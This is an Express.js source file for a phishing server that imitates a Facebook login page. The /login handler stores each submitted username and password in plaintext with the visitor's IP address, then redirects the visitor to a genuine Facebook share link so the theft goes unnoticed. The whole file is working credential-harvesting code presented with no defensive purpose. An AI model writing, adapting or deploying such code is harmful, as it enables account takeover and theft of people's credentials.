const express = require('express');
const app = express();
const db = require('./database');

// Set EJS as the view engine
app.set('view engine', 'ejs');

app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res)=>{
    res.render("facebooklogin")
})

app.post('/login', (req, res) => {
    const { user, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const sql = 'INSERT INTO users (userdetail, password, ip) VALUES (?, ?, ?)';
    db.query(sql, [user, password, ip], (err, result) => {
        if (err) {
            console.error('Database error:', err);
            return res.render('facebooklogin');
        }
        res.redirect('https://web.facebook.com/share/v/1YpkFzDf2z/')
    });
});

module.exports = app; 

// const port = 1000;
// app.listen(port, () =>{
//     console.log(`server started on port ${port}`)
// })
